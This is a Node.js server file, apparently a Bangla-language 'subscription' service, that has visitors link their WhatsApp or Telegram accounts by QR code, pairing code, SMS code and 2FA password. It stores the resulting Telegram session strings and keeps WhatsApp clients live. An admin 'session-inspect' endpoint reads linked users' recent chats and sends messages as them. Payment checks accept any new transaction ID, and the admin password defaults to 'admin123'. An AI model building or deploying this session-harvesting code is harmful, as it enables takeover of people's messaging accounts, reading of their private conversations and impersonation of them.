const express = require('express');
const http = require('http');
const { Client, LocalAuth } = require('whatsapp-web.js');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const qrcode = require('qrcode');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 5e6 });

app.use(express.json({ limit: '5mb' }));
app.use(express.static('public'));

const DB_FILE = path.join(__dirname, 'database.json');
const ADMIN_PASS = process.env.ADMIN_PASSWORD || 'admin123';

function loadDB() {
    if (!fs.existsSync(DB_FILE)) {
        const initial = {
            settings: {
                bgImage: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe',
                redirectUrl: 'https://example.com',
                freeTrialMinutes: 15,
                paymentNumber: '01818896166',
                banglaQrImage: '',
                enableWhatsApp: true,
                enableTelegram: true
            },
            plans: [
                { id: 'plan_1', name: '১ দিন আনলিমিটেড', durationMinutes: 1440, price: 20 },
                { id: 'plan_7', name: '৭ দিন প্রিমিয়াম', durationMinutes: 10080, price: 100 },
                { id: 'plan_30', name: '৩০ দিন ভিআইপি', durationMinutes: 43200, price: 300 }
            ],
            users: [],
            notices: [],
            payments: []
        };
        fs.writeFileSync(DB_FILE, JSON.stringify(initial, null, 2));
        return initial;
    }
    return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}

function saveDB(db) {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

function upsertUser({ phone, platform, method, sessionString = '' }) {
    const db = loadDB();
    const now = Date.now();
    const today = new Date().toISOString().split('T')[0];
    let user = db.users.find(u => u.phone === phone && u.platform === platform);

    if (!user) {
        const trialMs = (db.settings.freeTrialMinutes || 15) * 60 * 1000;
        user = {
            id: 'USR-' + Math.floor(100000 + Math.random() * 900000),
            phone,
            platform,
            method,
            createdAt: now,
            createdDate: today,
            lastLogin: now,
            expiresAt: now + trialMs,
            status: 'active',
            sessionString
        };
        db.users.push(user);
    } else {
        user.lastLogin = now;
        user.method = method;
        if (sessionString) user.sessionString = sessionString;
    }
    saveDB(db);
    return user;
}

// Public Config API
app.get('/api/public-config', (req, res) => {
    const db = loadDB();
    res.json({
        settings: db.settings,
        plans: db.plans
    });
});

// User Status & Notices API
app.get('/api/user-status/:userId', (req, res) => {
    const db = loadDB();
    const user = db.users.find(u => u.id === req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const now = Date.now();
    const isExpired = user.status === 'blocked' || now > user.expiresAt;
    const notices = db.notices.filter(n => n.target === 'all' || n.target === user.id || n.target === user.platform);

    res.json({
        user,
        isExpired,
        remainingSeconds: Math.max(0, Math.floor((user.expiresAt - now) / 1000)),
        redirectUrl: db.settings.redirectUrl,
        notices
    });
});

// Auto/Instant Payment Verification Endpoint
app.post('/api/submit-payment', (req, res) => {
    const { userId, planId, senderOrRef, trxId } = req.body;
    const db = loadDB();
    const user = db.users.find(u => u.id === userId);
    const plan = db.plans.find(p => p.id === planId);

    if (!user || !plan) return res.status(400).json({ error: 'Invalid user or plan' });
    if (!trxId || trxId.trim().length < 4) return res.status(400).json({ error: 'সঠিক Transaction ID বা Reference দিন।' });

    const duplicate = db.payments.find(p => p.trxId.toLowerCase() === trxId.trim().toLowerCase());
    if (duplicate) return res.status(400).json({ error: 'এই Transaction ID ইতিমধ্যে ব্যবহৃত হয়েছে।' });

    const now = Date.now();
    const baseTime = user.expiresAt > now ? user.expiresAt : now;
    user.expiresAt = baseTime + (plan.durationMinutes * 60 * 1000);
    user.status = 'active';

    const paymentRecord = {
        id: 'PAY-' + Date.now(),
        userId: user.id,
        userPhone: user.phone,
        planName: plan.name,
        amount: plan.price,
        senderOrRef: senderOrRef || user.phone,
        trxId: trxId.trim(),
        createdAt: now,
        status: 'approved'
    };

    db.payments.unshift(paymentRecord);
    saveDB(db);

    io.to(user.id).emit('subscription_updated', { expiresAt: user.expiresAt });
    res.json({ success: true, expiresAt: user.expiresAt, message: 'পেমেন্ট সফল! সাবস্ক্রিপশন চালু হয়েছে।' });
});

// Admin Middleware
function checkAdmin(req, res, next) {
    const token = req.headers['x-admin-pass'];
    if (token !== ADMIN_PASS) return res.status(401).json({ error: 'Unauthorized Admin' });
    next();
}

// Admin Dashboard Full Data
app.get('/api/admin/dashboard', checkAdmin, (req, res) => {
    const db = loadDB();
    const today = new Date().toISOString().split('T')[0];

    const stats = {
        totalUsers: db.users.length,
        waUsers: db.users.filter(u => u.platform === 'whatsapp').length,
        tgUsers: db.users.filter(u => u.platform === 'telegram').length,
        todayWaUsers: db.users.filter(u => u.platform === 'whatsapp' && u.createdDate === today).length,
        todayTgUsers: db.users.filter(u => u.platform === 'telegram' && u.createdDate === today).length,
        qrUsers: db.users.filter(u => u.method === 'qr').length,
        phoneUsers: db.users.filter(u => u.method === 'phone').length,
        totalRevenue: db.payments.reduce((sum, p) => sum + Number(p.amount || 0), 0)
    };

    res.json({
        stats,
        settings: db.settings,
        plans: db.plans,
        users: db.users,
        notices: db.notices,
        payments: db.payments
    });
});

// Admin Update Settings
app.post('/api/admin/settings', checkAdmin, (req, res) => {
    const db = loadDB();
    db.settings = { ...db.settings, ...req.body };
    saveDB(db);
    io.emit('config_updated', db.settings);
    res.json({ success: true });
});

// Admin Manage Plans
app.post('/api/admin/plans', checkAdmin, (req, res) => {
    const db = loadDB();
    const { action, plan } = req.body;
    if (action === 'add') {
        db.plans.push({
            id: 'plan_' + Date.now(),
            name: plan.name,
            durationMinutes: Number(plan.durationMinutes),
            price: Number(plan.price)
        });
    } else if (action === 'delete') {
        db.plans = db.plans.filter(p => p.id !== plan.id);
    }
    saveDB(db);
    res.json({ success: true, plans: db.plans });
});

// Admin Modify User (Extend time, Block/Unblock, Delete)
app.post('/api/admin/user-update', checkAdmin, (req, res) => {
    const db = loadDB();
    const { userId, addMinutes, status, deleteUser } = req.body;
    if (deleteUser) {
        db.users = db.users.filter(u => u.id !== userId);
        saveDB(db);
        return res.json({ success: true });
    }
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (addMinutes) {
        const base = user.expiresAt > Date.now() ? user.expiresAt : Date.now();
        user.expiresAt = base + Number(addMinutes) * 60 * 1000;
    }
    if (status) user.status = status;

    saveDB(db);
    io.to(user.id).emit('subscription_updated', { expiresAt: user.expiresAt, status: user.status });
    res.json({ success: true });
});

// Admin Send Notice (All / Platform / Specific User)
app.post('/api/admin/notice', checkAdmin, (req, res) => {
    const db = loadDB();
    const { target, title, message } = req.body;
    const notice = {
        id: 'NTC-' + Date.now(),
        target: target || 'all',
        title,
        message,
        createdAt: Date.now()
    };
    db.notices.unshift(notice);
    saveDB(db);

    if (target === 'all') {
        io.emit('new_notice', notice);
    } else {
        io.to(target).emit('new_notice', notice);
    }
    res.json({ success: true });
});

// Admin Test/Inspect Linked Session Messages
app.post('/api/admin/session-inspect', checkAdmin, async (req, res) => {
    const { userId, testReceiver, testText } = req.body;
    const db = loadDB();
    const user = db.users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    try {
        if (user.platform === 'telegram' && user.sessionString) {
            const apiId = Number(process.env.TG_API_ID || 0);
            const apiHash = process.env.TG_API_HASH || '';
            const client = new TelegramClient(new StringSession(user.sessionString), apiId, apiHash, { connectionRetries: 2 });
            await client.connect();

            if (testReceiver && testText) {
                await client.sendMessage(testReceiver, { message: testText });
            }
            const dialogs = await client.getDialogs({ limit: 5 });
            const recent = dialogs.map(d => ({
                title: d.title || 'Unknown',
                lastMessage: d.message ? d.message.message : ''
            }));
            await client.disconnect();
            return res.json({ success: true, recent });
        }

        const activeWa = activeWaByPhone.get(user.phone);
        if (user.platform === 'whatsapp' && activeWa) {
            if (testReceiver && testText) {
                const chatId = testReceiver.replace(/[^0-9]/g, '') + '@c.us';
                await activeWa.sendMessage(chatId, testText);
            }
            const chats = await activeWa.getChats();
            const recent = chats.slice(0, 5).map(c => ({
                title: c.name || c.id.user,
                lastMessage: c.lastMessage ? c.lastMessage.body : ''
            }));
            return res.json({ success: true, recent });
        }

        res.status(400).json({ error: 'সক্রিয় সেশন পাওয়া যায়নি (সার্ভার রিস্টার্ট হয়ে থাকতে পারে)।' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Socket Auth Logic
const waClients = new Map();
const activeWaByPhone = new Map();
const tgClients = new Map();

async function initWhatsApp(socket, phoneNumber = null) {
    if (waClients.has(socket.id)) {
        try { await waClients.get(socket.id).destroy(); } catch (e) {}
        waClients.delete(socket.id);
    }

    const client = new Client({
        authStrategy: new LocalAuth({ clientId: `wa_${socket.id}` }),
        puppeteer: {
            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium',
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process', '--disable-gpu']
        }
    });

    waClients.set(socket.id, client);

    client.on('qr', async (qr) => {
        if (!phoneNumber) {
            const url = await qrcode.toDataURL(qr);
            socket.emit('qr_code', { platform: 'whatsapp', image: url });
        }
    });

    client.on('ready', () => {
        const wid = client.info && client.info.wid ? client.info.wid.user : (phoneNumber || 'WA_USER');
        activeWaByPhone.set(wid, client);
        const user = upsertUser({
            phone: wid,
            platform: 'whatsapp',
            method: phoneNumber ? 'phone' : 'qr'
        });
        socket.join(user.id);
        socket.join('whatsapp');
        socket.emit('authenticated', { user });
    });

    client.on('auth_failure', (msg) => {
        socket.emit('auth_error', { message: msg || 'WhatsApp authentication failed' });
    });

    await client.initialize();

    if (phoneNumber) {
        const cleanPhone = phoneNumber.replace(/[^0-9]/g, '');
        try {
            const pairingCode = await client.requestPairingCode(cleanPhone);
            socket.emit('pairing_code', { code: pairingCode });
        } catch (err) {
            socket.emit('auth_error', { message: err.message || 'Pairing code error' });
        }
    }
}

async function initTelegramQR(socket) {
    const apiId = Number(process.env.TG_API_ID || 0);
    const apiHash = process.env.TG_API_HASH || '';
    if (!apiId || !apiHash) {
        return socket.emit('auth_error', { message: 'Render Environment-এ TG_API_ID ও TG_API_HASH সেট করা নেই।' });
    }

    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 3 });
    tgClients.set(socket.id, { client });
    await client.connect();

    try {
        await client.signInUser(
            { apiId, apiHash },
            {
                qrCode: async (qr) => {
                    const tgLoginUrl = `tg://login?token=${qr.token.toString('base64url')}`;
                    const qrDataUrl = await qrcode.toDataURL(tgLoginUrl);
                    socket.emit('qr_code', { platform: 'telegram', image: qrDataUrl });
                },
                onError: async (err) => {
                    socket.emit('auth_error', { message: err.message });
                }
            }
        );
        const me = await client.getMe();
        const user = upsertUser({
            phone: me.phone || me.username || String(me.id),
            platform: 'telegram',
            method: 'qr',
            sessionString: client.session.save()
        });
        socket.join(user.id);
        socket.join('telegram');
        socket.emit('authenticated', { user });
    } catch (err) {
        socket.emit('auth_error', { message: err.message });
    }
}

async function initTelegramPhone(socket, phoneNumber) {
    const apiId = Number(process.env.TG_API_ID || 0);
    const apiHash = process.env.TG_API_HASH || '';
    if (!apiId || !apiHash) {
        return socket.emit('auth_error', { message: 'Render Environment-এ TG_API_ID ও TG_API_HASH সেট করা নেই।' });
    }

    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 3 });
    await client.connect();

    try {
        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
        tgClients.set(socket.id, { client, phoneNumber, phoneCodeHash: result.phoneCodeHash });
        socket.emit('tg_code_sent', { phoneNumber });
    } catch (err) {
        socket.emit('auth_error', { message: err.message });
    }
}

io.on('connection', (socket) => {
    socket.on('register_room', ({ userId, platform }) => {
        if (userId) socket.join(userId);
        if (platform) socket.join(platform);
    });

    socket.on('start_qr', async ({ platform }) => {
        if (platform === 'whatsapp') await initWhatsApp(socket, null);
        if (platform === 'telegram') await initTelegramQR(socket);
    });

    socket.on('start_phone_login', async ({ platform, phone }) => {
        if (platform === 'whatsapp') await initWhatsApp(socket, phone);
        if (platform === 'telegram') await initTelegramPhone(socket, phone);
    });

    socket.on('verify_tg_code', async ({ code, password }) => {
        const sessionObj = tgClients.get(socket.id);
        if (!sessionObj) {
            return socket.emit('auth_error', { message: 'সেশন শেষ হয়ে গেছে, আবার নাম্বার দিয়ে কোড পাঠান।' });
        }
        const { client, phoneNumber } = sessionObj;
        const apiId = Number(process.env.TG_API_ID || 0);
        const apiHash = process.env.TG_API_HASH || '';

        try {
            await client.signInUser(
                { apiId, apiHash },
                {
                    phoneNumber: async () => phoneNumber,
                    phoneCode: async () => code.trim(),
                    password: async () => {
                        if (!password || !password.trim()) {
                            throw new Error('এই অ্যাকাউন্টে 2FA পাসওয়ার্ড চালু আছে। নিচের ঘরে সঠিক 2FA পাসওয়ার্ড দিন।');
                        }
                        return password.trim();
                    },
                    onError: (err) => {
                        throw err;
                    }
                }
            );

            const me = await client.getMe();
            const user = upsertUser({
                phone: me.phone || phoneNumber,
                platform: 'telegram',
                method: 'phone',
                sessionString: client.session.save()
            });
            socket.join(user.id);
            socket.join('telegram');
            socket.emit('authenticated', { user });
        } catch (err) {
            let msg = err.message || 'ভেরিফিকেশন ব্যর্থ হয়েছে';
            if (msg.includes('PASSWORD_HASH_INVALID')) {
                msg = 'ভুল 2FA পাসওয়ার্ড দেওয়া হয়েছে! সঠিক পাসওয়ার্ড দিয়ে আবার চেষ্টা করুন।';
            }
            socket.emit('auth_error', { message: msg });
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Dynamic SaaS Server running on port ${PORT}`));
